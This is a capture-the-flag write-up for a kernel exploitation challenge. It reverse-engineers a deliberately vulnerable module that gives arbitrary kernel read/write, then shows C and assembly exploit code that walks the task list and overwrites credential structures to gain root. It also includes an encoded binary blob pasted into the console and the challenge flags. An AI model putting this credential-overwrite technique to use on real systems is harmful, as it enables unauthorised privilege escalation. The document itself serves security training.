# a-smap-in-the-face

[library.m0unt41n.ch/challenges/a-smap-in-the-face](https://library.m0unt41n.ch/challenges/a-smap-in-the-face) ![](../../resources/pwn.svg) ![](../../resources/medium.svg) 

# TL;DR

We are given unprivileged console access to a system with a suspicious-looking module.
We have a copy of the Docker image for easy offline testing - `bzImage`/`initramfs.cpio`,
`pipeline.ko` kernel module (binary-only) and scripts to start QEMU within the container.
The goal is to print the `/flag`.

What we do:

*   Decompile the module - realize that enables us to read/write kernel memory
    at arbitrary offsets, using `ioctl()`.
*   Figure out offsets to some kernel structures: `init_task`,
    `task_struct->tasks.next`, `task_struct->cred`.
*   Develop an exploit, which:
    *   Walks through process table
    *   Overwrites any 1000's in the credentials (`ctf` user) with zeros.
*   Inject the exploit in a form of tiny, hand-crafted ELF, using `uuencode`
    into the console.
*   Run the exploit, print the `/flag`

# General notes

Tools used:

*   [IDA Free](https://hex-rays.com/ida-free/)
*   [GEF](https://hugsy.github.io/gef/)
*   [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf)
*   [smallest-executable-program-x86-64-linux](https://stackoverflow.com/questions/53382589/smallest-executable-program-x86-64-linux)
*   [kernel/v4.19.76](https://elixir.bootlin.com/linux/v4.19.76/source)

**I actually have no idea what I'm doing**. I never tried hacking on kernel before, therefore:

*   The write-up is quite detailed (I want to document all the thought
    processes for myself).
*   This is probably not the shortest and most elegant solution. I'm pretty
    sure that `1337` syscall was there for a reason.

Let's get cracking! &#128578;

<br>

# Artifacts we get

## Docker container

Needs to be fixed first, it is missing one trailing slash:

```bash
sed -i '/^COPY.*app$/s/$/\//' Dockerfile
```

Can be built and run

```bash
docker build -t smap:latest .
docker run -p 1337:1337 smap:latest
```

`boot.sh` runs a simple socat:

```bash
socat TCP-LISTEN:1337,reuseaddr,fork EXEC:"./run_qemu.sh",pty,stderr,setsid,sigint,sane &
wait $!
```

... and this exposes a non-root console on port `1337`.


# Initial look at the target system

*   Very minimal, Busybox/uClibc-based image. Not much possibility to install or build extra software.
*   Kernel `4.19.76`, booted with `console=ttyS0 oops=panic panic=1 nokaslr`
*   QEMU booted with `-smp cores=1,threads=1 -cpu kvm64,smep,smap -s`
    *   Presumably with the idea to trick us into trying to actually bypas SMAP (see challenge name).
    *   With `-s`, QEMU is exporting debugger access on port `1234`
*   We get a bare non-root shell (`user=ctf`, `uid=1000`). Every time we connect, the kernel starts from scratch.
*   As the kernel boots, we see some fun messages:

```
  [    2.183032] vuln: loading out-of-tree module taints kernel.
  [    2.186341] Installed secure data processing pipeline kernel module v2.19.8-fe. 
  [    2.186558] -----------------------------------------------------
  [    2.186700] ---------High Speed Data Processing Pipeline---------
  [    2.186800] -----------------------------------------------------
  [    2.186894] [*] .........Boot Sequence Initialized.
  [    2.187011] [*] .........Processing System Information.
  [    2.187131] [*] .........Security Mitigations Enabled.
  [    2.187254] [*] System Cores: 76
  [    2.187332] [*] Network Latency: 9ms
  [    2.187426] [*] Memory Allocation: 718MB
  [    2.187514] [?] .........Awaiting User Data>_
```

*   There is a `/dev/pipeline`, but can't write or read there
*   We have no way to either copy a file into the victim OS, nor build anything there (no GCC, etc.)
    We just have a single Bash session, the system shuts down once we exit it.
*   Fun fact: `/bin/su` is not SUID
*   Very simple `/etc/init.d/rcS`

```bash
  chown root:root flag
  chmod 400 flag

  insmod /pipeline.ko
  chmod 666 /dev/pipeline
  setsid cttyhack setuidgid 1000 sh

  umount /proc
  umount /sys
  poweroff -d 0  -f
```

# Closer look at the kernel module

We decompile with IDA.  What we have is:

*   A simple device handler
*   No read/write functionality, but implements a couple of `ioctl()`:
    *   `0x10` / `0x40`: printing fancy messages to the kernel log
    *   `0x20` / `0x30`: pretty much exporting `copy_to_user()` and `copy_from_user()` functionality to userspace (!!!)
    *   `1337` extracting a magic value, from what looks like something in TCB. But, at this point, we don't see what.

Ignoring all the module boilerplate, the important part seems to be:

```c
void __fastcall pipeline_ioctl(__int64 fd, int ioctl_id, void *ioctl_param) {
  __int64 secret, var1, var2, len;
  switch ( ioctl_id ) {
    case 0x10:
      pipeline_ioctl_cold();
      break;
    case 0x20:
      // This effectively exports copy_from_kernel as ioctl 0x20, that can be
      // called with a 24-byte buffer containing three 64-bit values
      //   void *src_in_kernel
      //   void *dst_in_user
      //   long len
      if ( !copy_from_user(&var1, ioctl_param, 24LL) )
        copy_to_user(var2, var1, len);
      break;
    case 0x30:
      // Similarly, this exports copy_to_kernel as ioctl 0x30, with buffer containing:
      //    void *dst_in_kernel
      //    void *src_in_user
      //    long len
      if ( !copy_from_user(&var1, ioctl_param, 24LL) )
        copy_from_user(var1, var2, len);
      break;
    case 0x40:
      boot();
      break;
    case 0x1337:
      printk(&unk_640);  // ".6DEBUGGING ONLY - REMOVE IN PROD"
      // Extract an current_task->mm->pgd into address pointed by *second* item
      // in the long[3] buffer.
      secret = *(_QWORD *)(*(_QWORD *)(__readgsqword((unsigned int)&current_task) + 0x3D8) + 0x50LL);
      if ( !copy_from_user(&var1, ioctl_param, 24LL) )
        copy_to_user(var2, &secret, 8LL);
      break;
  }
}
```

(full version: [pipeline.c](https://github.com/mufl0n/mufl0n.github.io/blob/main/shc/pwn/a-smap-in-the-face/pipeline.c))

# Set up the tools

Let's prepare some tooling that will be useful in further debugging / crafting the exploit

## Skeleton for our exploit code

We don't know what the exploit will look like yet, but we can already wrap these ioctls in
some nice C functions.

> Note: in the final version we will not be able to use a large C program and will need to rewrite
> this as a tiny, hand-crafted ELF binary. We will get to that. For now, we just want easy way
> to experiment with what is possible with the system.

**exploit.c**
```c
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>

int pipeline_fd;
unsigned long params[3];

void open_pipeline() {
  pipeline_fd = open("/dev/pipeline", O_RDWR, 0666);
}

void cold_boot() {
  ioctl(pipeline_fd, 0x10, NULL);
}

void copy_to_user(void *dest, void *src, int len) {
  params[0] = (unsigned long)src;
  params[1] = (unsigned long)dest;
  params[2] = (unsigned long)len;
  ioctl(pipeline_fd, 0x20, &params);
}

void copy_from_user(void *dest, void *src, int len) {
  params[0] = (unsigned long)dest;
  params[1] = (unsigned long)src;
  params[2] = (unsigned long)len;
  ioctl(pipeline_fd, 0x30, &params);
}

void boot() {
  ioctl(pipeline_fd, 0x40, NULL);
}

unsigned long get_secret() {
  unsigned long result;
  params[1] = (unsigned long)&result;
  ioctl(pipeline_fd, 0x1337, &params);
  return result;
}
```

## Script to test the changes quickly

This builds the exploit and creates a temporary copy of the provided runtime environment,
with the exploit baked in. Then, starts it, using provided `start_qemu.sh` script.

> Interesting trick used: there is no need to "remaster" the initrd with an additional file.
> It turns out that kernel reads provided initrd file *until the end* and, if we **append**
> another cpio file after the first one, kernel will load it just fine and overwrite it
> on top of the first one.

Also we don't bother with Docker for now, just start the QEMU.

**test.sh**
```bash
#!/bin/bash
set -e
rm -rf tmpdir ; mkdir -p tmpdir ; cd tmpdir
gcc -static -o exploit ../exploit.c
ln -sf ../bzImage
cp ../initramfs.cpio .
echo exploit | cpio -H newc -o >>initramfs.cpio
exec bash ../run_qemu.sh
```

## Convert bzImage to more debuggable format

We will need annotated kernel disassembly / symbols, for reverse-engineering the
offsets in the kernel structures and for easier work with gdb. There is a tool for that:

```bash
$ git clone https://github.com/marin-m/vmlinux-to-elf 
$ vmlinux-to-elf/vmlinux-to-elf bzImage vmlinux.elf
$ rm -rf vmlinux-to-elf
```

test it

```bash
$ objdump -M intel -d vmlinux.elf
$ objdump -t vmlinux.elf
```

## Debugging the kernel

As mentioned, QEMU is configured to export a debug port for the running kernel.
We will be using it with GEF as follows:

```bash
$ gdb -ex "gef-remote 127.0.0.1 1234" vmlinux.elf
```

# What now???

*   It is pretty clear that with `copy_from_user` / `copy_to_user`, we have keys to the castle.
*   The easiest seems to be to change the UID, but, at first glance, it's not obvious where
*   Having kernel source does not help directly, as most of the critical structs are randomized
    (an example in [task_struct](https://elixir.bootlin.com/linux/v4.19.76/source/include/linux/sched.h#L593)).
*   There is that intriguing magic value returned by `1337` syscall.

## Overall workflow for finding offsets of kernel structures

*   Find source code for the interesting structure
*   Find xrefs to a reasonably simple function that manipulates it
*   Look at the assembly code for that function (either with `objdump` or `gdb`)
*   Try to reason the structure offsets, by comparing the C code with the assembly.

# Understanding the semantics of the magic `1337` syscall

The driver code enables us to extract the following value from the kernel:

`*(_QWORD *)(*(_QWORD *)(__readgsqword((unsigned int)&current_task) + 0x3D8) + 0x50LL);`

What is it and how can it help us with privilege escalation?

## `+0x3D8` within `task_struct`:

Searching for `+0x3d8` in the kernel disassembly, gets us the following code in `map_vdso_source`:

```asm
ffffffff81002940 <map_vdso_once>:
ffffffff81002940:       41 56                   push   r14
ffffffff81002942:       41 55                   push   r13
ffffffff81002944:       49 89 fd                mov    r13,rdi
ffffffff81002947:       41 54                   push   r12
ffffffff81002949:       55                      push   rbp
ffffffff8100294a:       49 89 f6                mov    r14,rsi
ffffffff8100294d:       65 48 8b 04 25 40 4d    mov    rax,QWORD PTR gs:0x14d40
ffffffff81002954:       01 00 
ffffffff81002956:       53                      push   rbx
ffffffff81002957:       48 8b 98 d8 03 00 00    mov    rbx,QWORD PTR [rax+0x3d8]
ffffffff8100295e:       4c 8d 63 70             lea    r12,[rbx+0x70]
ffffffff81002962:       4c 89 e7                mov    rdi,r12
ffffffff81002965:       e8 a6 2c 99 00          call   ffffffff81995610 <down_write>
(...)
```

Corresponding [source code](https://elixir.bootlin.com/linux/v4.19.76/source/arch/x86/entry/vdso/vma.c#L259):

```c
int map_vdso_once(const struct vdso_image *image, unsigned long addr) {
	struct mm_struct *mm = current->mm;
	down_write(&mm->mmap_sem);
(...)
```

Okay, so **0x3B8** is **current_task->mm**

## `+0x50` within `mm_struct`:

Similarly, searching for `+0x50` we can find the following in `pgd_alloc` (which takes `mm_struct` as argument)::

```asm
ffffffff810529f0 <pgd_alloc>:
ffffffff810529f0:       55                      push   rbp
ffffffff810529f1:       53                      push   rbx
ffffffff810529f2:       be 01 00 00 00          mov    esi,0x1
ffffffff810529f7:       48 89 fb                mov    rbx,rdi
ffffffff810529fa:       bf c0 80 70 00          mov    edi,0x7080c0
ffffffff810529ff:       48 83 ec 10             sub    rsp,0x10
ffffffff81052a03:       e8 c8 4c 0f 00          call   ffffffff811476d0 <__get_free_pages>
ffffffff81052a08:       48 85 c0                test   rax,rax
ffffffff81052a0b:       48 89 c5                mov    rbp,rax
ffffffff81052a0e:       0f 84 28 01 00 00       je     ffffffff81052b3c <pgd_alloc+0x14c>
ffffffff81052a14:       48 8d 74 24 08          lea    rsi,[rsp+0x8]
ffffffff81052a19:       48 89 43 50             mov    QWORD PTR [rbx+0x50],rax
(...)
```

Corresponding [source code](https://elixir.bootlin.com/linux/v4.19.76/source/arch/x86/mm/pgtable.c#L434)

```c
pgd_t *pgd_alloc(struct mm_struct *mm)
{
	pgd_t *pgd;
	pmd_t *u_pmds[MAX_PREALLOCATED_USER_PMDS];
	pmd_t *pmds[MAX_PREALLOCATED_PMDS];
	pgd = _pgd_alloc();
	if (pgd == NULL)
		goto out;
	mm->pgd = pgd;
(...)
```

So, **0x50** is **mm->pgd**

## ... so what?

Well, the problem is that I have no idea what to do with this information &#128522;
This was really first time I tried digging in the kernel at this level, and
I couldn't find how knowing where `pgd` is would help me exploit having
access to `copy_to_user` and `copy_from_user`.

Still: we can freely read and write kernel space. Just need to find where.

# Can we get `gs:current_task`?

Another idea would be to find the kernel address of the current `task_struct`
and try to tweak process permissions in it. But, the `1337` syscall does not
help with that and we don't have any other fixed pointer to get it.

# Walking the process list

One thing we **can** try is to find `init_task`. With KASLR disabled it should
be stable, and we can try to walk the struct from there, finding offsets for
other structures in similar way (source code + disassembly)

## Finding address of `init_task` in the kernel memory

`init_task` is defined [here](https://elixir.bootlin.com/linux/v4.19.76/source/include/linux/sched/task.h#L26).
There are not many direct references to it, but, it's accessed quite a few times with
[for_each_process](https://elixir.bootlin.com/linux/v4.19.76/source/include/linux/sched/signal.h#L561) macro, which,
using [next_task](https://elixir.bootlin.com/linux/v4.19.76/source/include/linux/sched/signal.h#L558) macro,
operates on `tasks` entry in `task_struct`. These entries are of
[list_head](https://elixir.bootlin.com/linux/v4.19.76/source/scripts/kconfig/list.h#L24) type and are simple structs with two pointers (`*next` and `*prev`).

Looking at one instance of `for_each_process` usage in
[clear_tasks_mm_cpumask](https://elixir.bootlin.com/linux/v4.19.76/source/kernel/cpu.c#L775):

```c
void clear_tasks_mm_cpumask(int cpu) {
	struct task_struct *p;
	WARN_ON(cpu_online(cpu));
	rcu_read_lock();
	for_each_process(p) {
		t = find_lock_task_mm(p);
		if (!t) continue;
		cpumask_clear_cpu(cpu, mm_cpumask(t->mm));
		task_unlock(t);
	}
	rcu_read_unlock();
}
```

...and its disassembly:

```asm
ffffffff8105cf60 <clear_tasks_mm_cpumask>:
ffffffff8105cf60:       55                      push   rbp
ffffffff8105cf61:       89 fd                   mov    ebp,edi
ffffffff8105cf63:       53                      push   rbx
ffffffff8105cf64:       48 0f a3 2d f4 31 2e    bt     QWORD PTR [rip+0x12e31f4],rbp  # ffffffff82340160 <_etext+0x73cf8f>
ffffffff8105cf6b:       01 
ffffffff8105cf6c:       72 47                   jb     ffffffff8105cfb5 <clear_tasks_mm_cpumask+0x55>
ffffffff8105cf6e:       48 c7 c3 40 17 21 82    mov    rbx,0xffffffff82211740
ffffffff8105cf75:       48 8b 9b 88 03 00 00    mov    rbx,QWORD PTR [rbx+0x388]
ffffffff8105cf7c:       48 81 eb 88 03 00 00    sub    rbx,0x388
ffffffff8105cf83:       48 81 fb 40 17 21 82    cmp    rbx,0xffffffff82211740
ffffffff8105cf8a:       74 26                   je     ffffffff8105cfb2 <clear_tasks_mm_cpumask+0x52>
ffffffff8105cf8c:       48 89 df                mov    rdi,rbx
ffffffff8105cf8f:       e8 2c 86 0e 00          call   ffffffff811455c0 <find_lock_task_mm>
ffffffff8105cf94:       48 85 c0                test   rax,rax
ffffffff8105cf97:       74 dc                   je     ffffffff8105cf75 <clear_tasks_mm_cpumask+0x15>
ffffffff8105cf99:       48 8b 90 d8 03 00 00    mov    rdx,QWORD PTR [rax+0x3d8]
ffffffff8105cfa0:       f0 48 0f b3 aa d8 03    lock btr QWORD PTR [rdx+0x3d8],rbp
ffffffff8105cfa7:       00 00 
ffffffff8105cfa9:       c6 80 f8 06 00 00 00    mov    BYTE PTR [rax+0x6f8],0x0
ffffffff8105cfb0:       eb c3                   jmp    ffffffff8105cf75 <clear_tasks_mm_cpumask+0x15>
ffffffff8105cfb2:       5b                      pop    rbx
ffffffff8105cfb3:       5d                      pop    rbp
ffffffff8105cfb4:       c3                      ret
ffffffff8105cfb5:       48 c7 c7 e0 57 fb 81    mov    rdi,0xffffffff81fb57e0
ffffffff8105cfbc:       e8 98 c3 04 00          call   ffffffff810a9359 <printk>
ffffffff8105cfc1:       0f 0b                   ud2
ffffffff8105cfc3:       eb a9                   jmp    ffffffff8105cf6e <clear_tasks_mm_cpumask+0xe>
```

... we don't just see that **`init_task` is at `0xffffffff82211740`**, but also:

*   **that the offset of `tasks` in the `task_struct` is `0x388`** (or at least, the `tasks.next`, but, that's all we care for)
*   that the `next` value in the `tasks` does not simply point to next tasks's `task_struct`, but, to the `0x388` offset in it.
    Presumably an optimization for faster walking.

Without KASLR, we don't expect any of that to change between runs - and few iterations of restarting the VM / checking above
code with GDB, confirms that.

### Walking the task list

So, we know the `init_task` and the offset of `tasks.next` within that. At this point, we can write an "exploit" that walks over the task list
in a way similar to `for_each_process` macro and prints the addresses of the TCB:

```c
(...)

#define INIT_TASK 0xffffffff82211740
#define O_NEXT    0x388
#define BUF_SIZE  0x1000

int main() {
  open_pipeline();
  unsigned long task = INIT_TASK;
  copy_to_user(&task, (void*)(task+O_NEXT), 8);
  while((task-O_NEXT)!=INIT_TASK) {
    printf("Found process at 0x%lx\n", task-O_NEXT);
    copy_to_user(&task, (void*)(task), 8);
  }
  return 0;
}
```

Let's try

```bash
/ $ /exploit
Found process at 0xffff88807d7d0000
Found process at 0xffff88807d7d0c40
(...)
Found process at 0xffff88807cdba4c0
Found process at 0xffff88807cdbbd40
/ $ 
```

It seems to work, the loop has concluded once it got back to `INIT_TASK`.

## Where is `real_cred`?

Next thing to figure out is where the credentials are stored within the task.

We need to find pointer to 
[real_cred](https://elixir.bootlin.com/linux/v4.19.76/source/include/linux/sched.h#L835)
within `task_struct` (type [cred](https://elixir.bootlin.com/linux/v4.19.76/source/include/linux/cred.h#L116))
in similar way to how we found `tasks`. And similarly, it is not
used directly a lot, but most often via [current_real_cred()](https://elixir.bootlin.com/linux/v4.19.76/source/include/linux/cred.h#L294)
macro - searching for which, gets us:
[proc_pid_attr_write](https://elixir.bootlin.com/linux/v4.19.76/source/fs/proc/base.c#L2580):

```c
static ssize_t proc_pid_attr_write(struct file * file, const char __user * buf, size_t count, loff_t *ppos) {
	struct inode * inode = file_inode(file);
	struct task_struct *task;
	void *page;
	int rv;

	rcu_read_lock();
	task = pid_task(proc_pid(inode), PIDTYPE_PID);
	if (!task) {
		rcu_read_unlock();
		return -ESRCH;
	}
	/* A task may only write its own attributes. */
	if (current != task) {
		rcu_read_unlock();
		return -EACCES;
	}
	/* Prevent changes to overridden credentials. */
	if (current_cred() != current_real_cred()) {
		rcu_read_unlock();
		return -EBUSY;
	}
	rcu_read_unlock();
(...)
```

...and its assembly version:

```asm
ffffffff8120d9a0 <proc_pid_attr_write>:
ffffffff8120d9a0:       41 57                   push   r15
ffffffff8120d9a2:       49 89 cf                mov    r15,rcx
ffffffff8120d9a5:       41 56                   push   r14
ffffffff8120d9a7:       41 55                   push   r13
ffffffff8120d9a9:       49 89 fd                mov    r13,rdi
ffffffff8120d9ac:       41 54                   push   r12
ffffffff8120d9ae:       49 89 f4                mov    r12,rsi
ffffffff8120d9b1:       55                      push   rbp
ffffffff8120d9b2:       48 89 d5                mov    rbp,rdx
ffffffff8120d9b5:       53                      push   rbx
ffffffff8120d9b6:       48 8b 47 20             mov    rax,QWORD PTR [rdi+0x20]
ffffffff8120d9ba:       48 8b 78 b8             mov    rdi,QWORD PTR [rax-0x48]
ffffffff8120d9be:       31 f6                   xor    esi,esi
ffffffff8120d9c0:       e8 6b a2 e6 ff          call   ffffffff81077c30 <pid_task>
ffffffff8120d9c5:       48 85 c0                test   rax,rax
ffffffff8120d9c8:       0f 84 d0 00 00 00       je     ffffffff8120da9e <proc_pid_attr_write+0xfe>
ffffffff8120d9ce:       48 89 c3                mov    rbx,rax
ffffffff8120d9d1:       65 48 8b 04 25 40 4d    mov    rax,QWORD PTR gs:0x14d40
ffffffff8120d9d8:       01 00 
ffffffff8120d9da:       48 39 c3                cmp    rbx,rax
ffffffff8120d9dd:       0f 85 a0 00 00 00       jne    ffffffff8120da83 <proc_pid_attr_write+0xe3>
ffffffff8120d9e3:       48 8b 83 18 06 00 00    mov    rax,QWORD PTR [rbx+0x618]
ffffffff8120d9ea:       48 39 83 20 06 00 00    cmp    QWORD PTR [rbx+0x620],rax
ffffffff8120d9f1:       0f 85 95 00 00 00       jne    ffffffff8120da8c <proc_pid_attr_write+0xec>
ffffffff8120d9f7:       41 be 00 10 00 00       mov    r14d,0x1000
ffffffff8120d9fd:       48 81 fd 00 10 00 00    cmp    rbp,0x1000
ffffffff8120da04:       4c 0f 46 f5             cmovbe r14,rbp
(...)
```

... from which we can infer that it's **either `0x618` or `0x620`** (`current_cred` vs `current_real_cred`). We'll go with `0x618`.

### Walking the task lists, with creds

```c
(...)

#define INIT_TASK 0xffffffff82211740
#define O_NEXT    0x388
#define O_CRED    0x618
#define BUF_SIZE  0x1000

int main() {
  open_pipeline();
  unsigned long task = INIT_TASK;
  copy_to_user(&task, (void*)(task+O_NEXT), 8);
  while((task-O_NEXT)!=INIT_TASK) {
    printf("Found process at 0x%lx\n", task-O_NEXT);
    void *cred_ptr;
    copy_to_user((void*)&cred_ptr, (void*)(task-O_NEXT+O_CRED), 8);
    int cred[16];
    copy_to_user(&cred, cred_ptr, sizeof(cred));
    for (int i=0;i<16;i++)
      if (cred[i]==1000)
        printf("   Found 1000 at index %d\n", i*sizeof(int));
    copy_to_user(&task, (void*)(task), 8);
  }
  return 0;
}
```

Let's try:

```bash
/ $ /exploit
Found process at 0xffff88807d7d0000
Found process at 0xffff88807d7d0c40
(...)
Found process at 0xffff88807cee55c0
Found process at 0xffff88807cee0000
   Found 1000 at index 4
   Found 1000 at index 8
   Found 1000 at index 12
   Found 1000 at index 16
   Found 1000 at index 20
   Found 1000 at index 24
   Found 1000 at index 28
   Found 1000 at index 32
Found process at 0xffff88807cee6e40
   Found 1000 at index 4
   Found 1000 at index 8
   Found 1000 at index 12
   Found 1000 at index 16
   Found 1000 at index 20
   Found 1000 at index 24
   Found 1000 at index 28
   Found 1000 at index 32
/ $ 
```

Looks like it is doing what we want.

## Getting root!

At this point, my next idea was to find the current task, change its
credentials to 0 and exploit from here.

But, I wanted to try something simpler first: what if we find **all**
tasks that are running as PID 1000 and change that to 0? This will
have a nice property of also changing parent shell, giving us instant
root.

### Walking the task list, "fixing" creds as needed

```c
(...)

#define INIT_TASK 0xffffffff82211740
#define O_NEXT    0x388
#define O_CRED    0x618
#define BUF_SIZE  0x1000

int main() {
  open_pipeline();
  unsigned long task = INIT_TASK;
  copy_to_user(&task, (void*)(task+O_NEXT), 8);
  while((task-O_NEXT)!=INIT_TASK) {
    printf("Found process at 0x%lx\n", task-O_NEXT);
    void *cred_ptr;
    copy_to_user((void*)&cred_ptr, (void*)(task-O_NEXT+O_CRED), 8);
    int cred[16];
    copy_to_user(&cred, cred_ptr, sizeof(cred));
    for (int i=0;i<16;i++)
      if (cred[i]==1000) {
        printf("   Found 1000 at index %d\n", i*sizeof(int));
        cred[i]=0;
      }
    copy_from_user(cred_ptr, &cred, sizeof(cred));
    copy_to_user(&task, (void*)(task), 8);
  }
  return 0;
}
```

### Now, there is a *lot* that can go wrong here:

*   We are pretty much YOLO'ing through the `cred` structure, blindly replacing 1000s with 0s.
*   We are writing back a kernel structure, that might have been modified in the meantime (preemption, etc)

But, let's try anyway:

```bash
/ $ /exploit
Found process at 0xffff88807d7d0000
Found process at 0xffff88807d7d0c40
(...)
Found process at 0xffff88807cd04980
Found process at 0xffff88807cd03100
   Found 1000 at index 4
   Found 1000 at index 8
   Found 1000 at index 12
   Found 1000 at index 16
   Found 1000 at index 20
   Found 1000 at index 24
   Found 1000 at index 28
   Found 1000 at index 32
Found process at 0xffff88807cd01880
   Found 1000 at index 4
   Found 1000 at index 8
   Found 1000 at index 12
   Found 1000 at index 16
   Found 1000 at index 20
   Found 1000 at index 24
   Found 1000 at index 28
   Found 1000 at index 32
/ # id
uid=0(root) gid=0(root) groups=1000
/ # cat /flag
shc2024{DEMO_FLAG_DO_NOT_SUBMIT}
```

Success!

# Making it tiny

We will use the framework described at [https://stackoverflow.com/questions/53382589/smallest-executable-program-x86-64-linux](https://stackoverflow.com/questions/53382589/smallest-executable-program-x86-64-linux).

What follows is mostly the above C exploit rewritten in x86 assembly, trying to make it as small as possible.
Some techniques used:

*   With above testing, we saw that there is eight of these 1000's, starting at
    offset 4 in the `cred_struct`. We can just zero them out with `rep stosd`.
*   We reuse some registers through the code - the only thing we are calling are
    syscalls, and [ABI says](https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux)
    that only `rax`, `rcx` and `r11` are not preserved.
    *   `rdi` keeps the file descriptor through the code
    *   `rdx` keeps the address of our ioctl param buffer
    *   Additionally, `IOCTL_COPY_TO_USER` in `rsi` can be also preserved through few subsequent calls
*   Contents of the ioctl param buffer does not change between reading and writing the `cred` struct
*   All memory variables are declared in the uninitialized area, further shortening what we have
    to pass to the remote system.


```asm
;##############################################################################
; https://stackoverflow.com/questions/53382589/smallest-executable-program-x86-64-linux
bits 64
        org     0x08048000
ehdr:                              ; Elf64_Ehdr
        db      0x7F,"ELF",2,1,1,0 ;   e_ident
times 8 db      0
        dw      2                  ;   e_type
        dw      62                 ;   e_machine
        dd      1                  ;   e_version
        dq      _start             ;   e_entry
        dq      phdr - $$          ;   e_phoff
        dq      0                  ;   e_shoff
        dd      0                  ;   e_flags
        dw      ehdrsize           ;   e_ehsize
        dw      phdrsize           ;   e_phentsize
        dw      1                  ;   e_phnum
        dw      0                  ;   e_shentsize
        dw      0                  ;   e_shnum
        dw      0                  ;   e_shstrndx
ehdrsize equ $ - ehdr
phdr:                              ; Elf64_Phdr
        dd      1                  ;   p_type
        dd      7                  ;   p_flags
        dq      0                  ;   p_offset
        dq      $$                 ;   p_vaddr
        dq      $$                 ;   p_paddr
        dq      filesize           ;   p_filesz
        dq      filesize           ;   p_memsz
        dq      0x1000             ;   p_align
phdrsize equ $ - phdr

;##############################################################################

; https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
; https://syscalls64.paolostivanin.com/
%define SYS_OPEN                2
%define SYS_IOCTL               16
%define SYS_EXIT                60

; gcc -dM -E -include fcntl.h - < /dev/null | grep ' O_'
%define O_RDWR                  02o

%define IOCTL_COPY_TO_USER      0x20
%define IOCTL_COPY_FROM_USER    0x30

%define INIT_TASK               0xffffffff82211740
%define O_NEXT                  0x388
%define BUF_SIZE                0x1000
%define CRED_SIZE               16 * 8
%define CRED_OFS                0x618

_start:
        mov            rdi, sDevPipeline
        mov            rsi, O_RDWR
        mov            rdx, 666o
        mov            eax, SYS_OPEN
        syscall
        mov            rdi, rax          ; pipeline_fd, preserved through syscalls
        mov            rdx, ioctl_arg    ; preserved through syscalls

        mov            rax, INIT_TASK+O_NEXT

loop:
        mov            QWORD [rdx], rax
        mov            QWORD [rdx+8], task
        mov            QWORD [rdx+16], 8
        mov            rsi, IOCTL_COPY_TO_USER
      ; mov            rdx, ioctl_arg
        mov            eax, SYS_IOCTL
        syscall

        mov            rax, [task]
        sub            rax, O_NEXT
        cmp            rax, INIT_TASK
        je             finish

        mov            QWORD [rdx], rax
        mov            QWORD [rdx+8], buf
        mov            QWORD [rdx+16], BUF_SIZE
      ; mov            rsi, IOCTL_COPY_TO_USER
      ; mov            rdx, ioctl_arg
        mov            eax, SYS_IOCTL
        syscall

        mov            rax, [buf+CRED_OFS]
      ; mov            [cred_ofs], rax

        mov            QWORD [rdx], rax
        mov            QWORD [rdx+8], cred
        mov            QWORD [rdx+16], CRED_SIZE
      ; mov            rsi, IOCTL_COPY_TO_USER
      ; mov            rdx, ioctl_arg
        mov            eax, SYS_IOCTL
        syscall

        xor            rax, rax
        push           rdi
        lea            rdi, [cred+4]
        mov            rcx, 8
        rep            stosd
        pop            rdi

      ; mov            rax, [cred_ofs]
      ; mov            QWORD [rdx], rax
      ; mov            QWORD [rdx+8], cred
      ; mov            QWORD [rdx+16], 16*8
        mov            rsi, IOCTL_COPY_FROM_USER
      ; mov            rdx, ioctl_arg
        mov            eax, SYS_IOCTL
        syscall

        mov            rax, [task]
        jmp            loop

finish:
        mov            eax, SYS_EXIT
        syscall


sDevPipeline:
        db      "/dev/pipeline", 0

bss:
task           equ     bss
ioctl_arg      equ     task + 8
cred           equ     ioctl_arg + 24
buf            equ     cred + CRED_SIZE

filesize       equ     $ - $$
```

All that gives us a nice 214-bytes binary, that can be easily uuencoded:

```
$ nasm -f bin -o exploit exploit.asm && chmod +x exploit && gzip -9 exploit
$ ls -la exploit.gz
-rwxr-xr-x. 1 muflon muflon 214 Apr 20 22:03 exploit.gz
$ echo "echo -e \"$(uuencode -m exploit.gz /tmp/exploit.gz | tr '\n' _ | sed 's/_/\\n/g')\" | uudecode"
echo -e "begin-base64 755 /tmp/exploit.gz\nH4sICKEfJGYCA2V4cGxvaXQAq3f1cWNiZGSAASYGOwYQr6KBhQPEd2DABA4M\nFgwwHSCaHVkSqg9GR0EVwmgGAQjlsd+nEaJiHxOQ2LUNKL8DxOJn9eg87rEr\nCSrrcfzACSnFJo9OJo/jThxRQFEgLQCS2qcAJHYIQLR0s6iC5XQ7mIF6bB3E\nFZtKMqGafkE1gaxGUi/UARSGqKiCqmhAMtHwQLhHr41qHVBqJ8i6z6vj9xlg\n2vgy6f///ztswGL6Kall+gWZBak5mXmpDADpL3sJWgEAAA==\n====\n" | uudecode
```

# Final exploit

## Local

Pasting that `echo` command in the VM console:

```
/ $ echo -e "begin-base64 755 /tmp/exploit.gz\nH4sICKEfJGYCA2V4cGxvaXQAq3f1cWNiZGSAASYGOwYQr6KBhQPEd2DABA4M\nFgwwHSCaHVkSqg9GR0EVwmgGAQjlsd+nEaJiHxOQ2LUNKL8DxOJn9eg87rEr\nCSrrcfzACSnFJo9OJo/jThxRQFEgLQCS2qcAJHYIQLR0s6iC5XQ7mIF6bB3E\nFZtKMqGafkE1gaxGUi/UARSGqKiCqmhAMtHwQLhHr41qHVBqJ8i6z6vj9xlg\n2vgy6f///ztswGL6Kall+gWZBak5mXmpDADpL3sJWgEAAA==\n====\n" | uudecode
/ $ gunzip /tmp/exploit.gz
/ $ /tmp/exploit
/ # id 
uid=0(root) gid=0(root) groups=1000
/ # cat /flag
shc2024{DEMO_FLAG_DO_NOT_SUBMIT}
```

## Remote

And, finally, doing this in the CTF environment:

```
/ # cat /flag
shc2024{I_did_tax_evasion_for_fun_and_pr0fit}
```

---

## `shc2024{I_did_tax_evasion_for_fun_and_pr0fit}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
